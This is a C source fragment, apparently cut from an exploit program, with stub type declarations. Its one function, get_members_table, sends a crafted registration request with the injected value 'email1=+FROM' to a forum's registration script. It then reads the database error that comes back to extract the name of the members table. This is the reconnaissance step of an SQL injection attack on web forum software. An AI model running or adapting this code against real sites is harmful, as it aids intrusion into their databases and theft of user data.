
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
typedef int sa ;
typedef int buf ;


 int AF_INET ;
 char* SCRIPT ;
 int SOCK_STREAM ;
 char* USERAGENT ;
 int close (int) ;
 scalar_t__ connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 char* path ;
 int perror (char*) ;
 int printf (char*) ;
 int safe_recv (int,char*,int,int ) ;
 int safe_send (int,char*,int ,int ) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*,char*,char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;
 char* strstr (char*,char*) ;
 char* target_host ;

char *get_members_table(struct sockaddr_in sa)
{
 static char members_table[64];
 char buf[1024], *p, *q;
 int s;

 if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
  perror("socket");
  exit(1);
 }
 if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
  perror("connect");
  exit(1);
 }
 sprintf(buf,
  "GET %s/%s?action=reg&regsubmit=1&email1=+FROM HTTP/1.1\r\n"
  "Host: %s\r\n"
  "Content-type: application/x-www-form-urlencoded\r\n"
  "User-Agent: %s\r\n"
  "Connection: close\r\n"
  "\r\n",
  path, SCRIPT, target_host, USERAGENT);
 safe_send(s, buf, strlen(buf), 0);
 safe_recv(s, buf, sizeof(buf), 0);

 if (!((p = strstr(buf, "FROM "))) || !((q = strstr((p+5), " WHERE")))) {
  printf("cant get members table. maybe wrong path?\n");
  exit(1);
 }
 *q = '\0';
 strcpy(members_table, p+5);

 close(s);
 return members_table;
}
